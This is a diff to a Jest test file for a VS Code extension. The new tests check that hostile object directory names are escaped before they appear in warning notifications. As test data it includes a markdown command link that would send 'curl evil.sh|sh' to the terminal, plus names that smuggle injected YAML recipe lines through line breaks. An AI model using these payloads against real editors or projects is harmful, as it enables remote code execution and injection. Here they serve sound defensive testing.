@@ -63,10 +63,14 @@ import { PythonTestHarness } from '../../RecipeFakerService.ts/RecipeYamlScalar/
 
 const INJECTED_OBJECT_API_NAME = 'Injected__c';
 const INJECTED_RECIPE_LINES = `- object: ${INJECTED_OBJECT_API_NAME}\n  fields:\n    ${INJECTED_FIELD_API_NAME}: \${{ globalThis.${INJECTION_MARKER} = true }}\n#`;
+// VS CODE RENDERS THIS IN A NOTIFICATION AS A LINK THAT RUNS THE COMMAND; IT HAS NO "/", SO IT IS A VALID DIRECTORY NAME
+const COMMAND_LINK_NAME = '[Regenerate now](command:workbench.action.terminal.sendSequence?%7B%22text%22%3A%22curl%20evil.sh%7Csh%5Cn%22%7D)';
+const NOTIFICATION_LINK_PATTERN = /\[[^\]]*\]\([^)]*\)/;
 const HOSTILE_OBJECT_DIRECTORY_NAMES = [
     `EvilLineFeed\n${INJECTED_RECIPE_LINES}`,
     `EvilCarriageReturn\r${INJECTED_RECIPE_LINES.replace(/\n/g, '\r')}`,
-    `EvilLineSeparator\u2028${INJECTED_RECIPE_LINES.replace(/\n/g, '\u2028')}`
+    `EvilLineSeparator\u2028${INJECTED_RECIPE_LINES.replace(/\n/g, '\u2028')}`,
+    COMMAND_LINK_NAME
 ];
 const HOSTILE_REFERENCE_TO = `EvilParent\n${INJECTED_RECIPE_LINES}`;
 const HOSTILE_REFERENCE_TO_XML = HOSTILE_REFERENCE_TO.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '&#10;');
@@ -221,6 +225,8 @@ describeWherePossible.each([
         expect(warningMessages[0]).toContain('"EvilCarriageReturn\\r- object: Injected__c');
         expect(warningMessages[0]).toContain('"EvilLineSeparator\\u2028- object: Injected__c');
         expect(warningMessages[0]).toContain('"EvilParent\\n- object: Injected__c');
+        expect(warningMessages[0]).toContain('"\\u005bRegenerate now\\u005d\\u0028command:');
+        expect(warningMessages[0]).not.toMatch(NOTIFICATION_LINK_PATTERN);
 
     });
 
@@ -312,6 +318,65 @@ describe('Generate Treecipe over ordinary object names', () => {
         expect(Object.keys(objectInfoWrapper.ObjectToObjectInfoMap).sort()).toEqual(ORDINARY_OBJECT_API_NAMES);
         expect(objectInfoWrapper).not.toHaveProperty('SkippedObjectApiNames');
         expect(vscode.window.showWarningMessage).not.toHaveBeenCalled();
+
+    });
+
+});
+
+describe('DirectoryProcessor.escapeForNotification', () => {
+
+    test.each([
+        ['a command link', COMMAND_LINK_NAME],
+        ['a link split by a line break', '[a]\n(command:x)'],
+        ['a nested link', '[[a](command:x)](command:y)']
+    ])('leaves no link VS Code would render in %s', (unusedDescription, hostileName) => {
+
+        const escapedName = DirectoryProcessor.escapeForNotification(hostileName);
+
+        expect(escapedName).not.toMatch(NOTIFICATION_LINK_PATTERN);
+        expect(escapedName).not.toMatch(/[[\]()]/);
+        expect(escapedName).not.toMatch(EVERY_LINE_BREAK);
+
+    });
+
+    test('leaves an ordinary name as it is', () => {
+
+        expect(DirectoryProcessor.escapeForNotification('ns__Thing__c')).toBe('ns__Thing__c');
+
+    });
+
+});
+
+describe('DirectoryProcessor.warnOfSkippedObjectApiNames', () => {
+
+    test('lists at most the first twenty names and counts the rest', () => {
+
+        mockConfiguration(() => new FakerJSRecipeFakerService());
+        const showWarningMessage = vscode.window.showWarningMessage as jest.Mock;
+        showWarningMessage.mockClear();
+        const objectInfoWrapper = new ObjectInfoWrapper();
+        Array.from({ length: 25 }, (unusedValue, index) => `Bad Name ${index}`).forEach(name => objectInfoWrapper.addKeyToObjectInfoMap(name));
+
+        new DirectoryProcessor().warnOfSkippedObjectApiNames(objectInfoWrapper);
+
+        expect(showWarningMessage).toHaveBeenCalledTimes(1);
+        const warningMessage = showWarningMessage.mock.calls[0][0] as string;
+        expect(warningMessage).toContain('skipped 25 object name(s)');
+        expect(warningMessage).toContain('"Bad Name 19"');
+        expect(warningMessage).not.toContain('"Bad Name 20"');
+        expect(warningMessage).toContain(' and 5 more.');
+
+    });
+
+    test('warns about nothing when nothing was refused', () => {
+
+        mockConfiguration(() => new FakerJSRecipeFakerService());
+        const showWarningMessage = vscode.window.showWarningMessage as jest.Mock;
+        showWarningMessage.mockClear();
+
+        new DirectoryProcessor().warnOfSkippedObjectApiNames(new ObjectInfoWrapper());
+
+        expect(showWarningMessage).not.toHaveBeenCalled();
 
     });
 
